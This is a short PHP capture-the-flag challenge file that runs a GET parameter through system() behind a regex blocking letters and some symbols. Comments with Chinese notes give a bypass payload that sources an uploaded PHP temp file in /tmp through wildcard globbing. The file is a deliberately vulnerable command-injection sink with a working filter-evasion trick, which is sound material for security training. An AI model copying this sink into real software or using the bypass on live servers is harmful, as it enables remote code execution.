<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/
// https://blog.csdn.net/qq_46091464/article/details/108513145
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
// payload ?c=.+/???/????????[@-[]
// . 执行文件
// /???/????????[@-[]
// /tmp/php?????[@-[] 最后一位大写
// php上传文件特性 在/tmp/文件夹下 名字9位，最后一大写